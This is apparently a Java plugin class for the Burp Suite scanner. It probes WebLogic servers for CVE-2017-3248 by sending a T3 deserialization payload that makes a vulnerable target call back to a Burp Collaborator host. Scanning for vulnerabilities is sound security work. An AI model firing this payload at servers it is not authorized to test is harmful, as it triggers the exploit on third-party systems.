package probes;

import burp.*;

import java.net.Socket;
import java.net.URL;

public class CVE_2017_3248 extends Probe {
    private static final String NAME = "CVE-2017-3248";
    private static final String SEVERITY = "High";
    private static String detail = "WebLogic has a T3 protocol vulnerability!";

    @Override
    public IScanIssue check(IHttpRequestResponse requestResponse) {
        URL target = Utilities.helpers.analyzeRequest(requestResponse).getUrl();
        String pollPayload = Utilities.collaborator.generatePayload(true);
        boolean vulnerable = false;
        String result = "";
        try {
            Socket s = new Socket(target.getHost(), target.getPort());
            s.setSoTimeout(10);

            result = sendT3Payload(s, JRMPClient.getPayloadBytes(pollPayload, "registry"));
            s.close();
        } catch (Exception e) {
            e.printStackTrace();
        }

        for (IBurpCollaboratorInteraction interaction : Utilities.collaborator.fetchCollaboratorInteractionsFor(pollPayload)) {
//            byte[] rawQuery = Base64.getDecoder().decode(interaction.getProperty("raw_query").getBytes());
//            if (rawQuery.length > 0) {
//                Utilities.out.println(new String(rawQuery));
//            }

            detail = detail + "<br/>"
                    + "Receive a " + interaction.getProperty("type")
                    + " query from " + interaction.getProperty("client_ip")
                    + " at " + interaction.getProperty("time_stamp");

            vulnerable = true;
        }

        if (vulnerable) {
//            detail = detail + "<br/><br/>" + result;
            return new WebLogicIssue(requestResponse, NAME, detail, SEVERITY);
        } else return null;
    }
}
